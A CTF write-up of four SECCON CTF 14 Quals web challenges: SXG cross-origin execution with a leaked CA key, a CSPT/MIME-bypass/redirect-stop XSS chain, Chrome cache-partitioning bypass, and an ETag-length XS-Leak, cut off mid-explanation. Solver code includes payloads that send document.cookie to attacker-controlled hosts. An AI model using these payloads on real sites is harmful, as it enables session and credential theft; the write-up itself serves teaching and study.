---
title: "[ENG] 2025 SECCON CTF 14 Quals Web Challenges Writeup"
date: 2025-12-31 09:15:55
tags:
  - Writeup
  - CTF
  - SECCON
  - SECCON 14 Quals
  - Security
  - Web
language: en
author: Predic, ElleuchX1, irogir, Masamune
thumbnail: "/images/thumbnail/seccon_14_writeup.png"
copyright: |
  © 2025 REWRITE LAB (References) Author: Rewrite Lab (Predic, ElleuchX1, irogir, Masamune)
  This copyright applies to this document only.
---

# TL;DR

SECCON CTF 14 Quals ran for 24 hours, from 05:00 (UTC) on December 13, 2025 to 05:00 (UTC) on December 14, 2025.

There were a total of 4 web challenges, created by three authors: satoooon, RyotaK, and Ark.
In particular, all four challenges featured a bot, which made them even more interesting.

All of the challenges were excellent, and since some of them were quite difficult, I wrote up solutions for the four problems below.

- broken-challenge (54 solves)
- dummyhole (15 solves)
- framed-xss (7 solves)
- impossible-leak (1 solve)

Enjoy!

# broken-challenge

## TL;DR

This challenge leverages HTTP/2 Signed HTTP Exchange (SXG) to achieve cross-origin code execution. By exploiting the way Chromium handles SXG, we can execute JavaScript in the context of a target origin.

## Overview

The provided express app only has a few routes: one allows us to submit an url for the bot to visit, and - rather uncommon - one that exposes a private key:

`index.js`

```jsx
import express from "express";
import rateLimit from "express-rate-limit";
import fs from "fs";

import { visit, challenge, flag } from "./conf.js";

if (!flag.validate(flag.value)) {
  console.log(`Invalid flag: ${flag.value}`);
  process.exit(1);
}

const app = express();

app.use(express.json());
app.set("view engine", "ejs");

app.get("/", (req, res) => {
  res.render("index", {
    name: challenge.name,
  });
});

app.get("/hint", (req, res) => {
  res.render("hint", {
    hint: fs.readFileSync("./cert.key"),
  });
});

app.use(
  "/api",
  rateLimit({
    windowMs: 60_000,
    max: challenge.rateLimit,
  })
);

app.post("/api/report", async (req, res) => {
  const { url } = req.body;
  if (
    typeof url !== "string" ||
    (!url.startsWith("http://") && !url.startsWith("https://"))
  ) {
    return res.status(400).send("Invalid url");
  }

  try {
    await visit(url);
    res.sendStatus(200);
  } catch (e) {
    console.error(e);
    res.status(500).send("Something went wrong");
  }
});

app.listen(1337);
```

Checking out the Dockerfile, we see that this certificate is added to the NSS database:

```
certutil -A -d "sql:/home/pptruser/.pki/nssdb" -n "seccon" -t "CT,c,c" -i ./cert.crt

```

> T means the certificate is trusted as a certificate authority for SSL server authentication.

That means, we can issue certificates for any domain.

From `conf.js`, it also becomes clear that the goal is to exfiltrate a (non-httpOnly) cookie from the domain `hack.the.planet.seccon`:

```jsx
await context.setCookie({
  name: "FLAG",
  value: flag.value,
  domain: "hack.the.planet.seccon",
  path: "/",
});
```

## Solution

The first question that arises is how to achieve code execution on a domain that does not use a public suffix.

This is where the core difficulty of the challenge lies.

Since we are provided with a private key, which can be used to sign end-entity certificates, it is reasonable to look for ways to leverage this.

By searching for terms such as “web private key universal XSS”, one can eventually come across [this](https://i.blackhat.com/BH-USA-25/Presentations/USA-25-Chen-Cross-Origin-Web-Attacks-via-HTTP2-Server-Push-and-Signed-HTTP-Exchange-Thursday.pdf) Black Hat talk that discusses cross-origin web attacks enabled by SXG.

TL;DR: We can use SXG to execute code under the target origin, if we are able to obtain a valid certificate for the corresponding domain.

### SXG

SXG is a content delivery mechanism that allows a browser to verify the origin and integrity of a resource independently of the way it is delivered.
With SXG, publishers can safely make their content portable, meaning it can be redistributed by third parties while preserving content integrity and correct attribution.

We can exploit this mechanism to execute code on an origin different from the one the client is visiting.
That is, if the user agent supports SXG, it will allow us to serve an SXG containing content to be executed in the context of the target origin.

## Solver

I will use the tools `gen-signedexchange` and `gen-certurl` from [https://github.com/WICG/webpackage](https://github.com/WICG/webpackage) to generate the SXG and CBOR files.

Here is the step-by-step process (replace `<domain>` with your server domain):

```bash
#!/bin/bash
domain="<domain>"

openssl ecparam -name prime256v1 -genkey -out shared.key

openssl req -new -sha256 -key shared.key -out shared.csr \\
    -subj "/CN=hack.the.planet.seccon"

openssl x509 -req -days 90 -in shared.csr \\
    -CA cert.crt -CAkey cert.key -CAcreateserial \\
    -out cert.pem \\
    -extfile <(echo -e "1.3.6.1.4.1.11129.2.1.22 = ASN1:NULL\\nsubjectAltName=DNS:hack.the.planet.seccon")

SERIAL=$(openssl x509 -in cert.pem -serial -noout | cut -d= -f2)

echo -e "V\\t301231235959Z\\t\\t${SERIAL}\\tunknown\\t/CN=hack.the.planet.seccon" > index.txt

openssl ocsp -index index.txt \\
    -rsigner cert.crt -rkey cert.key \\
    -CA cert.crt \\
    -issuer cert.crt \\
    -serial "0x${SERIAL}" \\
    -respout cert.ocsp \\
    -ndays 7

gen-certurl -pem cert.pem -ocsp cert.ocsp > cert.cbor

```

Create the index.html with our payload:

```html
<script>
  fetch("https://<domain>/?".concat(document.cookie));
</script>
```

Create the SXG:

```bash
gen-signedexchange \\
  -uri <https://hack.the.planet.seccon/index.html> \\
  -content index.html \\
  -certificate cert.pem \\
  -privateKey shared.key \\
  -certUrl <https://$domain/cert.cbor> \\
  -validityUrl <https://hack.the.planet.seccon/validity> \\
  -o exploit.sxg

```

Generate server certificate:

```bash
domain="<domain>"

openssl genrsa -out attack_server.key 2048

cat > attack_server.cnf <<EOF
[ req ]
prompt = no
distinguished_name = dn
req_extensions = ext

[ dn ]
CN = ${domain}

[ ext ]
subjectAltName = DNS:${domain}
EOF

openssl req -new -key attack_server.key -out attack_server.csr -config attack_server.cnf

openssl x509 -req -days 3650 -in attack_server.csr -CA cert.crt -CAkey cert.key -CAcreateserial -out attack_server.crt -sha256 -extfile attack_server.cnf -extensions ext

```

Flask app for serving the SXG and CBOR files:

```python
from flask import Flask, send_file

app = Flask("")

@app.route("/index.sxg")
def serve_sxg():
    response = send_file(
        "exploit.sxg", mimetype="application/signed-exchange;v=b3", as_attachment=False
    )
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["Cache-Control"] = "no-store"
    return response

@app.route("/cert.cbor")
def serve_cbor():
    response = send_file(
        "cert.cbor", mimetype="application/cert-chain+cbor", as_attachment=False
    )
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["Cache-Control"] = "no-store"
    return response

if __name__ == "__main__":
    cert = "attack_server.crt"
    key = "attack_server.key"

    app.run(host="0.0.0.0", port=443, ssl_context=(cert, key))

```

If we now submit the url, we will see requests to our server for the SXG and CBOR files, and the flag exfiltrated.

FLAG : `SECCON{congratz_you_hacked_the_planet_521ce0597cdcd1e3}`

# dummyhole

## TL;DR

This challenge chains multiple vulnerabilities to achieve XSS. First, bypass MIME type validation by uploading a JSON file as `image/png+json`. We then use CSPT (Client-Side Path Traversal) in the `<POST_ID>` parameter to load our uploaded JSON and control `image_url`. By setting `image_url: ".attacker.com"`, it gets concatenated with `location.origin` to become something like `https://web.attacker.com`, creating an iframe pointing to our controlled domain. From there, we trigger a CSRF logout that redirects with two parameters: `<FALLBACK_URL>` (containing our XSS payload that feeds into `location.href`) and `<POST_ID>` (to block the navigation flow and ensure our payload executes).

## Overview

Beyond login and registration, the application allows us to create posts where we have full control over the title, description, and uploaded file.

![image.png](/[ENG]%202025%20SECCON%20CTF%2014%20Quals%20WEB%20Writeup/image.png)

These posts can then be accessed and rendered by navigating to their post ID.

![image.png](/[ENG]%202025%20SECCON%20CTF%2014%20Quals%20WEB%20Writeup/image%201.png)

After logging in, the bot visits the reported post. The goal is to achieve XSS and leak the flag

```jsx
import puppeteer from "puppeteer";

const ADMIN_USERNAME =
  process.env.ADMIN_USERNAME ??
  console.log("No admin username") ??
  process.exit(1);
const ADMIN_PASSWORD =
  process.env.ADMIN_PASSWORD ??
  console.log("No admin password") ??
  process.exit(1);
const FLAG = process.env.FLAG ?? console.log("No flag") ?? process.exit(1);

const APP_HOSTNAME = "web";
const APP_URL = "http://" + APP_HOSTNAME;

const sleep = async (ms) => new Promise((resolve) => setTimeout(resolve, ms));

export const visit = async (id) => {
  console.log(`start: ${id}`);

  const browser = await puppeteer.launch({
    headless: "new",
    executablePath: "/usr/bin/google-chrome-stable",
    args: [
      "--no-sandbox",
      "--disable-dev-shm-usage",
      "--disable-gpu",
      '--js-flags="--noexpose_wasm"',
    ],
  });

  const context = await browser.createBrowserContext();

  try {
    const page = await context.newPage();
    await context.setCookie({
      name: "FLAG",
      value: FLAG,
      domain: APP_HOSTNAME,
      path: "/",
    });

    // Login
    await page.goto(`${APP_URL}/login`, { timeout: 10_000 });
    await page.type('input[id="username"]', ADMIN_USERNAME);
    await page.type('input[id="password"]', ADMIN_PASSWORD);
    await page.click("button");

    await page.waitForSelector("#imageFile");

    // Visit reported post
    await page.goto(`${APP_URL}/posts/?id=${encodeURIComponent(id)}`, {
      timeout: 10_000,
    });
    await sleep(10_000);
    await page.close();
  } catch (e) {
    console.error(e);
  }

  await context.close();
  await browser.close();

  console.log(`end: ${id}`);
};
```

## Solution

### Client-Side Path Traversal

In `public/post.html`, there's a straightforward client-side path traversal in the `postId` parameter. The import requires the file to have a JSON MIME type due to the import assertion `with: { type: "json" }`.

```html
<script type="module">
  const params = new URLSearchParams(location.search);
  const postId = params.get("id");

  if (!postId) {
    document.getElementById("title").textContent = "No post ID provided";
    document.getElementById("title").className = "error";
  } else {
    try {
      const postData = await import(`/api/posts/${postId}`, {
        with: { type: "json" },
      });

      document.getElementById("title").textContent = postData.default.title;
      document.getElementById("description").textContent =
        postData.default.description;

      const imageUrl = `${location.origin}${postData.default.image_url}`;
      document.getElementById("imageFrame").src = imageUrl;
    } catch (error) {
      document.getElementById("title").textContent = "Error loading post";
      document.getElementById("title").className = "error";
      document.getElementById("description").textContent = error.message;
    }
  }
</script>
```

![image.png](/[ENG]%202025%20SECCON%20CTF%2014%20Quals%20WEB%20Writeup/image%202.png)

### **MIME Type bypass**

In the `server.js` file (upload route), We have the following check where the mimetype has to start with either `image/png` or `image/jpeg`

```js
if (
  !file.mimetype ||
  (!file.mimetype.startsWith("image/png") &&
    !file.mimetype.startsWith("image/jpeg"))
) {
  return res.status(400).json({ error: "Invalid file: must be png or jpeg" });
}
```

Searching for content-type suffixes, we find RFC 6839

-> RFC 6839 - Additional Media Type Structured Syntax Suffixes https://www.rfc-editor.org/rfc/rfc6839.html#section-3.1

Section 3.1 specifically covers the +json structured syntax suffix, According to it the suffix "+json" MAY be used with any media type whose representation follows that established for "application/json". This means `image/png+json` is technically a valid MIME type that indicates the content follows JSON structure.

Let's try that out by uploading the following

```md
------WebKitFormBoundarydk5AxJ9ubBQNVKDd
Content-Disposition: form-data; name="image"; filename="poc.png"
Content-Type: image/png+json

{}
------WebKitFormBoundarydk5AxJ9ubBQNVKDd--
```

Using the Client-Side Path traversal from the first section, we can point to the uploaded file `/posts/?id=../../../images/1c169269-c57b-47e2-b5cc-891efe66cb07`. We can see a different response from earlier.

![image.png](/[ENG]%202025%20SECCON%20CTF%2014%20Quals%20WEB%20Writeup/image%203.png)

Let's have a look at the client side code snippet again.

```js
document.getElementById("title").textContent = postData.default.title;
document.getElementById("description").textContent =
  postData.default.description;

const imageUrl = `${location.origin}${postData.default.image_url}`;
document.getElementById("imageFrame").src = imageUrl;
```

The code constructs the iframe's `src` by concatenating `location.origin` with our controlled `image_url` . By setting `image_url` to `.attacker.com`, the final imageUrl will be `https://web.attacker.com` - treating `location.origin` as a subdomain under our domain.

We can upload the following file and check the response.

```md
------WebKitFormBoundarydk5AxJ9ubBQNVKDd
Content-Disposition: form-data; name="image"; filename="poc.png"
Content-Type: image/png+json

{"image_url":".sechunt.tn:1234"}
------WebKitFormBoundarydk5AxJ9ubBQNVKDd--
```

We can check the response via `http://web/posts/?id=../../../../images/<id>` and we can see we were able to render the iframe pointing to our subdomain.

![image.png](/[ENG]%202025%20SECCON%20CTF%2014%20Quals%20WEB%20Writeup/image%204.png)

### **Achieving XSS**

The final part of this challenge is the following snippet in the logout.

```jsx
app.post("/logout", requireAuth, (req, res) => {
  const sessionId = req.cookies.session;
  sessions.delete(sessionId);
  res.clearCookie("session");

  const post_id = req.body.post_id?.length <= 128 ? req.body.post_id : "";
  const fallback_url =
    req.body.fallback_url?.length <= 128 ? req.body.fallback_url : "";

  const logoutPage = path.join(__dirname, "public", "logout.html");
  const logoutPageContent = fs
    .readFileSync(logoutPage, "utf-8")
    .replace("<POST_ID>", encodeURIComponent(post_id))
    .replace("<FALLBACK_URL>", encodeURIComponent(fallback_url));

  res.send(logoutPageContent);
});
```

We have a straightforward XSS at first sight, but we will never reach the sink as it will always redirect to `/posts/?id=whatever`

```html
<script>
  setTimeout(() => {
    const fallbackUrl = decodeURIComponent("<FALLBACK_URL>");
    if (!fallbackUrl) {
      location.href = "/";
      return;
    }
    location.href = fallbackUrl;
  }, 5000);
  const postId = decodeURIComponent("<POST_ID>");
  location.href = postId ? `/posts/?id=${postId}` : "/";
</script>
```

The goal is to somehow stop the redirect or delay it. One solution is mentioned in the following cctb research:

- https://lab.ctbb.show/research/stopping-redirects

```markdown
Specifically, in a Client-Side redirect, @kire_devs_hacks mentioned in Discord that Chrome’s Dangling Markup protection detects < together with \n or \t in a URL and will block the request, including navigations. The following will fail to redirect:

<script>
  location = "https://example.com/<\t"
</script>
```

With that in mind, we can write the following, we can save it as `pwn.html`

```markdown
<!DOCTYPE html>
<html>
<body>
<form method="POST" action="http://web/logout" id="f">
<textarea name="post_id" id="p"></textarea>
<textarea name="fallback_url" id="fb"></textarea>
</form>

<script>
p.value = '<\t';
fb.value = 'javascript:fetch("http://web.attacker:1234/?flag="+document.cookie)';
f.submit();
</script>
</body>
</html>
```

One minor issue remains: the iframe is created with the `credentialless` attribute, which prevents it from sending cookies. We can bypass this by using `window.open('/pwn.html')` to open our CSRF in a top-level tab.

```

<iframe id="imageFrame" credentialless></iframe>
```

What remains now, is to submit `../../../images/<id>` to the bot and get the flag

```markdown
[28/Dec/2025 16:46:12] "GET /pwn.html HTTP/1.1" 200 -
[28/Dec/2025 16:46:19] "GET /?flag=SECCON{why_c4nt_we_eat_the_d0nut_h0le} HTTP/1.1" 200 -
```

FLAG : `SECCON{why_c4nt_we_eat_the_d0nut_h0le}`

# framed-xss

## TL;DR

This challenge involves bypassing Chrome’s HTTP Cache Partitioning to achieve XSS.

While Chrome uses a `_cn` (cross-site) prefix in cache keys to isolate resources loaded across sites, we can strip this prefix by forcing a null initiator. Because Puppeteer’s initial `goto` runs with a null initiator, ensure the cache key not include the `_cn` prefix and use `history.back` to preserve the null-initiator state.

## Overview

`app.py`

```python
from flask import Flask, request

app = Flask(__name__)

@app.get("/")
def index():
    return """
<body>
  <h1>XSS Challenge</h1>
  <form action="/">
    <textarea name="html" rows="4" cols="36"></textarea>
    <button type="submit">Render</button>
  <form>
  <script type="module">
    const html = await fetch("/view" + location.search, {
      headers: { "From-Fetch": "1" },
    }).then((r) => r.text());
    if (html) {
      document.forms[0].html.value = html;
      const iframe = document.createElement("iframe");
      iframe.setAttribute("sandbox", "");
      iframe.srcdoc = html;
      document.body.append(iframe);
    }
  </script>
</body>
    """.strip()

@app.get("/view")
def view():
    if not request.headers.get("From-Fetch", ""):
        return "Use fetch", 400
    return request.args.get("html", "")

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=3000)

```

The application returns a page with a module script. The script fetch `/view` with the same query string via `fetch` and it can include a custom `From-Fetch` header. It then renders the returned HTML inside a sandboxed iframe.

![image.png](/[ENG]%202025%20SECCON%20CTF%2014%20Quals%20WEB%20Writeup/image%205.png)

`conf.js`

```jsx
import puppeteer from "puppeteer";

export const challenge = {
  name: "framed-xss",
  appUrl: new URL("<http://web:3000>"),
  rateLimit: 4, // max requests per 1 minute
};

export const flag = {
  value: process.env.FLAG,
  validate: (flag) => typeof flag === "string" && /^SECCON\\{.+\\}$/.test(flag),
};

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

export const visit = async (url) => {
  console.log(`start: ${url}`);

  const browser = await puppeteer.launch({
    headless: true,
    executablePath: "/usr/bin/chromium",
    args: [
      "--no-sandbox",
      "--disable-dev-shm-usage",
      "--js-flags=--noexpose_wasm,--jitless",
      "--disable-features=HttpsFirstBalancedModeAutoEnable",
    ],
  });

  const context = await browser.createBrowserContext();

  try {
    await context.setCookie({
      name: "FLAG",
      value: flag.value,
      domain: challenge.appUrl.hostname,
      path: "/",
    });

    const page = await context.newPage();
    await page.goto(url, { timeout: 3_000 });
    await sleep(5_000);
    await page.close();
  } catch (e) {
    console.error(e);
  }

  await context.close();
  await browser.close();

  console.log(`end: ${url}`);
};
```

The bot stores the flag in the cookie and then visits the URL. This could be typical XSS challenge.

## Solution

### HTTP Cache Partitioning

HTTP cache partitioning was publicly announced in 2020 and shipped with Chrome 86. Instead of caching purely by URL, Chrome keys HTTP-cache entries by (Network Isolation Key, URL). The Network Isolation Key is composed of the top-level site and the current-frame site. This has a measured cost (higher miss rate and slightly more network bytes).

Read more: [https://developer.chrome.com/blog/http-cache-partitioning](https://developer.chrome.com/blog/http-cache-partitioning)

![Cache Partitioning in the nutshell](https://colimd.masamune.tech/uploads/upload_543ea29d34743f132a691995a89c5cb0.png)

### Mitigation

> So, is it enough to prevent cross-site leaks or other attacks?

Not always, Chrome engineers also discuss it in [this conversation](https://groups.google.com/a/chromium.org/g/blink-dev/c/ZpyP6jjCUJE?pli=1).

> Chrome’s HTTP cache keying scheme will be updated to include an “is-cross-site-main-frame-navigation” boolean to mitigate cross-site leak attacks involving top-level navigation. Specifically, this will prevent cross-site attacks in which an attacker can initiate a top-level navigation to a given page and then navigate to a resource known to be loaded by the page in order to infer sensitive information via load timing. This change also improves privacy by preventing a malicious site from using navigations to infer whether a user has visited a given site previously.

So the "triple-key" is not sufficient for some cross-site leak scenarios because, for a navigation, the top-level and frame sites are derived from the destination you navigate to (so they don’t reflect who initiated the navigation).

And the solution is adding `_cn` to the cache key prefix, creating separate partitions. You can refer to [this slide](https://docs.google.com/presentation/d/1StMrI1hNSw_QSmR7bg0w3WcIoYnYIt5K8G2fG01O0IA/edit?usp=sharing) for a more detailed explanation.

[https://source.chromium.org/chromium/chromium/src/+/main:net/http/http_cache.cc;l=764;drc=8c7bd73f24f4936795272eece99089a6d75651cf;bpv=1;bpt=1?q=is_cross_site_main_frame_navigation_prefix&ss=chromium](https://source.chromium.org/chromium/chromium/src/+/main:net/http/http_cache.cc;l=764;drc=8c7bd73f24f4936795272eece99089a6d75651cf;bpv=1;bpt=1?q=is_cross_site_main_frame_navigation_prefix&ss=chromium)

```c
std::string_view is_cross_site_main_frame_navigation_prefix;
    if (initiator.has_value() && is_mainframe_navigation) {
      const bool is_initiator_cross_site =
          !net::SchemefulSite::IsSameSite(*initiator, url::Origin::Create(url));
      if (is_initiator_cross_site) {
        is_cross_site_main_frame_navigation_prefix =
            kCrossSiteMainFrameNavigationPrefix;
      }
    }

```

### Bypass

However, `is_cross_site_main_frame_navigation_prefix` is only triggered when the initiator is cross-site.

To bypass this and strip the `_cn` prefix, the request initiator must be null. Unfortunately, we cannot force a null initiator ourselves, but luckily Puppeteer can do this using the `goto` method. This technique was documented by icefonts in [this gist](https://gist.github.com/icesfont/a38cf323817a75d61e0612662c6d0476).

[https://source.chromium.org/chromium/chromium/src/+/main:net/cookies/cookie_util.cc;l=205-208;drc=279a6227254d9b856d6734660f637c4e53118e74](https://source.chromium.org/chromium/chromium/src/+/main:net/cookies/cookie_util.cc;l=205-208;drc=279a6227254d9b856d6734660f637c4e53118e74)

```c
// Create a SiteForCookies object from the initiator so that we can reuse
// IsFirstPartyWithSchemefulMode().
bool same_site_initiator =
    !initiator ||
    SiteForCookies::FromOrigin(initiator.value())
        .IsFirstPartyWithSchemefulMode(request_url, compute_schemefully);

```

Then use `history.back()` to return to the initial session that was created by Puppeteer’s first `goto`. That history entry retains the navigation context (including null initiator), so the subsequent navigation/redirect is evaluated with a null initiator and the `_cn` prefix logic doesn’t trigger.

### Initial navigation vs. history.back() relationship

Normally, if `evil.com` navigates you to `victim.com`, the navigation initiator is `evil.com`. Chrome sees this, identifies it as cross-site, and applies the `_cn` cache prefix.

However, Puppeteer starts the session with `page.goto()`, which results in an initial navigation context where the initiator is null. By navigating _away_ to a `blob:` URL and then calling `history.back()`, you are returning the browser to the state of that initial navigation.

So the attack flow is:

1. Bot opens URL via Puppeteer `goto` (initiator = null).
2. The attacker opens a popup with xss payload.
3. Attacker navigates to a `blob:` URL that calls `history.back()`.
4. From the restored entry, attacker redirects to `/view` while initiator = null is preserved.

With initiator = null:

![image.png](/[ENG]%202025%20SECCON%20CTF%2014%20Quals%20WEB%20Writeup/image%206.png)

Without initiator = null:

![image.png](/[ENG]%202025%20SECCON%20CTF%2014%20Quals%20WEB%20Writeup/image%207.png)

## Solver

```python
#!/usr/bin/env python3
import flask
import urllib.parse

app = flask.Flask(__name__)

BASE_URL = "<http://web:3000>"
WEBHOOK_URL = "http://WEBHOOK_URL"
XSS_PAYLOAD = f"<img src=x onerror=fetch(`{WEBHOOK_URL}/${{btoa(document.cookie)}}`)>"
count = 0
# Add no-store headers to responses
@app.after_request
def add_no_cache_headers(response):
    response.headers["Cache-Control"] = "no-store"
    return response

@app.route('/')
def index():
    global count
    count += 1
    if count % 2 == 1:
        # First visit: open popup and then navigate to blob URL that does history.back()
        return f'''
        <script>
        const sleep = (ms) => new Promise(r => setTimeout(r, ms));
        (async () => {{
            window.open("{BASE_URL}/?html={urllib.parse.quote(XSS_PAYLOAD, safe='')}", "popup");
            await sleep(1500);
            location = URL.createObjectURL(new Blob([`
                <script>
                    setTimeout(() => history.back(), 500);
                <\\\\/script>
            `], {{ type: "text/html" }}));
        }})();
        </script>
        '''
    else:
        # Second visit: redirect to /view with XSS payload
        count = 0
        return flask.redirect(f"{BASE_URL}/view?html={urllib.parse.quote(XSS_PAYLOAD, safe='')}")

if __name__ == '__main__':
    app.run('0.0.0.0', port=1234)

```

![](https://colimd.masamune.tech/uploads/upload_a02cb89d1a020d62c0aad7058b5a0a0d.png)

FLAG : `SECCON{New_fe4tur3,n3w_bypa55}`

# impossible-leak

## TL;DR

This challenge was a one-solve web problem and was arguably the hardest among the web challenges.

To solve it, one had to leverage XS-Leaks techniques, and there were multiple viable approaches.

The solution proposed by the challenge author (@Ark) was a cross-site ETag length leak. The key observation is that the ETag header length changes as the target file size increases. Using this, the attack intentionally triggered a 431 (Request Header Fields Too Large) error when the correct FLAG prefix/guess caused the response to grow. Then, it used the fact that when a 431 occurs, `history.length` does not increase, treating this as an oracle to exfiltrate the FLAG one character at a time.

[https://blog.arkark.dev/2025/12/26/etag-length-leak](https://blog.arkark.dev/2025/12/26/etag-length-leak)

In contrast, the only solver (@parrot409) presented an alternative approach: “XS-Leaks using in-memory disk cache.” This method relies on the fact that, in bot or incognito environments, the “in-memory disk cache” is much smaller than the normal on-disk disk cache.

The exploit first forcibly caches several resources to groom the cache, then repeatedly visits a page that performs a search for a specific byte value of the FLAG and checks whether the subsequent request is cached. If the guessed byte matches the FLAG, the response body becomes longer, exceeding the cache capacity; as a result, the next request is not cached. By exploiting these cache-behavior differences, the attacker can infer the FLAG.

[https://gist.github.com/parrot409/e3b546d3b76e9f9044d22456e4cc8622](https://gist.github.com/parrot409/e3b546d3b76e9f9044d22456e4cc8622)

## Overview

The server is a very simple note application.

```jsx
import express from "express";
import session from "express-session";
import crypto from "node:crypto";

const db = new Map();
const getNotes = (id) => {
  if (!db.has(id)) db.set(id, []);
  return db.get(id);
};

const app = express()
  .set("view engine", "ejs")
  .use(express.urlencoded())
  .use(
    session({
      secret: crypto.randomBytes(16).toString("base64"),
      resave: false,
      saveUninitialized: true,
    })
  );

app.get("/", (req, res) => {
  const { query = "" } = req.query;
  const notes = getNotes(req.session.id).filter((note) => note.includes(query));
  res.render("index", { notes });
});

app.post("/new", (req, res) => {
  const note = String(req.body.note).slice(0, 1024);
  getNotes(req.session.id).push(note);
  res.redirect("/");
});

app.listen(3000);
```

A `GET` request to the `/` endpoint allows you to search for notes that contain a given `query` value via a query parameter.

A `POST` request to the `/new` endpoint allows you to create a note of up to 1024 bytes.

The template file is as follows:

```jsx
<!DOCTYPE html>
<html>
  <body>
    <h1>Notes</h1>
    <form id="create" action="/new" method="post">
      <div>
        <input type="text" name="note" required />
        <input type="submit" value="Create" />
      </div>
    </form>
    <ul>
      <% notes.forEach(note => {%>
        <li><%= note %></li>
      <% }); %>
    </ul>
    <form action="/" method="get">
      <div>
        <input type="text" name="query" />
        <input type="submit" value="Search" />
      </div>
    </form>
  </body>
</html>

```

When searching for a value that matches the FLAG (assuming `SECCON{redacted}` is the FLAG):

![image.png](/[ENG]%202025%20SECCON%20CTF%2014%20Quals%20WEB%20Writeup/image%208.png)

When searching for a value that does **not** match the FLAG:

![image.png](/[ENG]%202025%20SECCON%20CTF%2014%20Quals%20WEB%20Writeup/image%209.png)

The bot code is as follows:

```jsx
import puppeteer from "puppeteer";

export const challenge = {
  name: "impossible-leak",
  appUrl: new URL("http://web:3000"),
  rateLimit: 3, // max requests per 1 minute
};

export const flag = {
  value: process.env.FLAG,
  validate: (flag) =>
    typeof flag === "string" &&
    flag.length < 24 &&
    /^SECCON\{[a-z_]+\}$/.test(flag),
};

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

export const visit = async (url) => {
  console.log(`start: ${url}`);

  const browser = await puppeteer.launch({
    headless: true,
    executablePath: "/usr/bin/chromium",
    args: [
      "--no-sandbox",
      "--disable-dev-shm-usage",
      "--js-flags=--noexpose_wasm,--jitless",
      "--disable-features=HttpsFirstBalancedModeAutoEnable",
    ],
  });

  const context = await browser.createBrowserContext();

  try {
    // Create a flag note
    const page1 = await context.newPage();
    await page1.goto(challenge.appUrl, { timeout: 3_000 });
    await page1.waitForSelector("#create");
    await page1.type("#create input[name=note]", flag.value);
    await page1.click("#create input[type=submit]");
    await sleep(1_000);
    await page1.close();
    await sleep(1_000);

    // Visit the given URL
    const page2 = await context.newPage();
    await page2.goto(url, { timeout: 3_000 });
    await sleep(60_000);
    await page2.close();
  } catch (e) {
    console.error(e);
  }

  await context.close();
  await browser.close();

  console.log(`end: ${url}`);
};
```

## Solution

The note content is safely escaped, so there is no HTML injection vector. Also, in the bot code, it waits for 60 seconds.

Therefore, to solve this challenge, you must approach it using an XS-Leaks technique.

First, you need to find an oracle that exhibits a behavioral difference between searching for the correct FLAG value and searching for an incorrect value. The only obvious difference I could observe was that the `Content-Length` becomes slightly longer when the FLAG appears.

However, this is exactly where the ETag Length XS-Leaks technique can be applied.

### ETag Length XS-Leaks

`ETag` is a byte-string identifier designed to represent an identifiable version of a resource representation in HTTP caching and synchronization mechanisms. In other words, the server assigns a specific ID to the resource representation at a given point in time and delivers it to the client via the `ETag` header. The client can then send that ID back to the server using headers such as `If-None-Match` to determine whether the resource has been modified.

The algorithm used to generate the ID value placed in an `ETag` can vary by server. However, there is a general requirement that it must be non-inferable by the client and opaque.

In this challenge, the Node.js framework used by the server generates ETags according to the algorithm implemented in `jshttp/etag`.

[https://github.com/jshttp/etag/blob/v1.8.1/index.js#L126-L131](https://github.com/jshttp/etag/blob/v1.8.1/index.js#L126-L131)

```jsx
function stattag(stat) {
  var mtime = stat.mtime.getTime().toString(16);
  var size = stat.size.toString(16);

  return '"' + size + "-" + mtime + '"';
}
```

```jsx
W / "stat.size(16) - stat.mtime.getTime(16)";
```

`stat.size` is determined by the `Content-Length`, and `stat.mtime.getTime` changes based on the file’s modification time—that is, the time at which a new ETag is generated.

The key point here is `stat.size`. Whenever the `Content-Length` changes, the `stat.size` value changes as well.

(1) When searching for a value that matches the FLAG:

![image.png](/[ENG]%202025%20SECCON%20CTF%2014%20Quals%20WEB%20Writeup/image%2010.png)

(2) When searching for a value that does **not** match the FLAG:

![image.png](/[ENG]%202025%20SECCON%20CTF%2014%20Quals%20WEB%20Writeup/image%2011.png)

In case (1), the `Content-Length` is `484`, and converting it to hexadecimal yields `1e4`.

In case (2), the `Content-Length` is `443`, and converting it to hexadecimal yields `1bb`.

As shown above, you can confirm that the value before the `-` character in the `ETag` changes to the hexadecimal value corresponding to the `Content-Length`.

Now, suppose we use CSRF to fill the memo list so that the `Content-Length` becomes `4095`—that is, so that the length corresponds to `fff` in hexadecimal. If, in this situation, an additional memo that contains the FLAG is included, the `Content-Length` will exceed `4095`, and the `stat.size` portion of the `ETag` will become larger than `fff`. At that point, since `stat.size` becomes `0x1000` or greater, the ETag grows by one more character.

Each time a memo is added, around 25 extra characters are appended due to HTML tags like `<li>` and newline characters. Accounting for that overhead, you can add three memos of the maximum length (1024 characters each) and one additional memo of 480 characters to make the `Content-Length` exactly `4095`.

```jsx
1024(dummy text) + 25(HTML tag, blank) => 1049
1024(dummy text) + 25(HTML tag, blank) => 1049
1024(dummy text) + 25(HTML tag, blank) => 1049
480(dummy text) + 25(HTML tag, blank) => 505

443(existing Length) + 1049*3 + 505 = 4095(fff)
```

![image.png](/[ENG]%202025%20SECCON%20CTF%2014%20Quals%20WEB%20Writeup/image%2012.png)

Could we use this to construct a more pronounced (clearer) oracle?

### Triggering a 431 Error via ETag Length

After receiving an ETag, the client includes that ETag value in the `If-None-Match` header when making the next request to the same URL.

Also, by default, Express enforces a limit on the maximum size of request headers.

[https://github.com/nodejs/node/blob/v25.2.1/src/node_options.h#L159](https://github.com/nodejs/node/blob/v25.2.1/src/node_options.h#L159)

```jsx
  uint64_t max_http_header_size = 16 * 1024;
```

If the request header size exceeds that limit, a 431 error is triggered.

Since the request headers can be influenced by the query value, if we supply a query string large enough to reach that threshold, then a 431 error will occur exactly when the ETag value grows by one byte (because the ETag is used in the `If-None-Match` header on the next request).

![In a local environment, when sending a query of size 15,787 and searching for a non-FLAG value (304 response)](/[ENG]%202025%20SECCON%20CTF%2014%20Quals%20WEB%20Writeup/image%2013.png)

In a local environment, when sending a query of size 15,787 and searching for a non-FLAG value (304 response)

